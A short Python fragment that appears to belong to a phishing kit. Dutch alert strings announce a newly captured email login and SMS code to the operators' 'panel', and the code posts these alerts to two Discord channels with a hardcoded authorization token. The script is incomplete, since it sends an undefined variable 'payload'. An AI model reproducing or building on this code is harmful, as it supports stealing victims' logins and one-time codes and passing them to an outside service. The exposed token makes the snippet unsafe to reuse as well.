import random
import time
import os

import requests
from textwrap import wrap
from flask import Flask, render_template, redirect, url_for, request
from multiprocessing import Process
import app as application
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options as ChromeOptions


GOON = {
    "content" : "NIEUWE INLOG MET EMAIL, KIJK SNEL PANEEEL"
}
SMS = {
    "content" : "NIEUWE SMS CODE, KIJK SNEL PANEEEL"
}

header = {
    'authorization': 'OTI3NTg0NzAwOTU0OTc2Mjg2.GXJ1Zk.xx4RexVa8-lgWyAZ-qbr3caYmrCdDK-4osMo_w'
}

r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=payload, headers=header)
r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=payload, headers=header)